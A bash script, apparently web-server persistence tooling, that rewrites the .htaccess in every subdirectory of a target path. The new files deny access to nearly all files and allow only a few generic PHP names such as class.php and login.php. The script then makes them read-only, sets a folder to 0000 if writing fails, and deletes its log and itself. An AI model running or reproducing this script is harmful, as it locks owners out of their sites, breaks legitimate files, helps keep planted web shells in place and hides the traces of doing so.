#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

TARGET_DIR=$1
LOG_FILE="$(dirname "$0")/logfile.log"

update_htaccess() {
  local dir="$1"
  local htaccess_file="$dir/.htaccess"

  if [ -f "$htaccess_file" ]; then
    cp "$htaccess_file" "$htaccess_file.bak"
    if ! rm -f "$htaccess_file"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi
  
  {
    echo "<Files *.ph*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.a*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.Ph*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.S*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.pH*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.PH*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo "<Files *.s*>"
    echo "    Order Deny,Allow"
    echo "    Deny from all"
    echo "</Files>"
    echo
    echo "<FilesMatch \"\\.(jpg|pdf|docx|jpeg|)\$\">"
    echo "    Order Deny,Allow"
    echo "    Allow from all"
    echo "</FilesMatch>"
    echo
    echo "<FilesMatch \"^(index.html|index.php|class.php|class-index.php|config.php|login.php)\$\">"
    echo " Order allow,deny"
    echo " Allow from all"
    echo "</FilesMatch>"
    echo
    echo "DirectoryIndex index.php index.html index.blade.php"
    echo
    echo "Options -Indexes"
  } > "$htaccess_file" || {
    local msg="$(date) - Failed to create .htaccess in $dir. Attempting to change folder permissions to 0000."
    echo "$msg" >> "$LOG_FILE"

    if ! chmod 0000 "$dir"; then
      local chmod_msg="$(date) - Failed to set permissions for folder $dir"
      echo "$chmod_msg" >> "$LOG_FILE"
    fi

    return
  }

  if ! chmod 0444 "$htaccess_file"; then
    local msg="$(date) - Failed to set permissions for .htaccess in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi
}

export -f update_htaccess
find "$TARGET_DIR" -type d -exec bash -c 'update_htaccess "$0"' {} \;
sleep 5
rm -f "$LOG_FILE" "$NOHUP_FILE" "$SCRIPT_PATH"

